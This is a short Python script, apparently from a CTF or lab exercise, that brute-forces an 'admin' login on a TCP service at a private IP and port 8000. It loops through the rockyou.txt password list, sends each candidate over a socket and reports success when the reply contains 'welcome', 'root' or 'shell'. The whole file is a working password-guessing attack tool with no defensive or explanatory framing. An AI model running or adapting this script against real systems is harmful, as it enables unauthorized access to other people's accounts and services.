import socket

host = "10.82.132.33"
port = 8000
wordlist = "/usr/share/wordlists/rockyou.txt"

print(f"[*] Starting brute force against {host}:{port}...")

with open(wordlist, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1) # Short timeout to keep it moving
            s.connect((host, port))
            
            # 1. Initiate admin login
            s.sendall(b"admin\n")
            s.recv(1024) 
            
            # 2. Send the password
            s.sendall(f"{password}\n".encode())
            
            # 3. Check for a response
            try:
                response = s.recv(1024).decode().strip()
                
                # If we actually get a response now, it's interesting!
                if response:
                    print(f"\n[!] ALERT: Password '{password}' got a response: {response}")
                    # Most likely success indicator:
                    if "welcome" in response.lower() or "root" in response.lower() or "shell" in response.lower():
                        print(f"[+++] SUCCESS! Password is: {password}")
                        s.close()
                        break
            except socket.timeout:
                # This is what happens for 99% of wrong passwords (silence)
                pass
                
            s.close()
        except Exception:
            continue
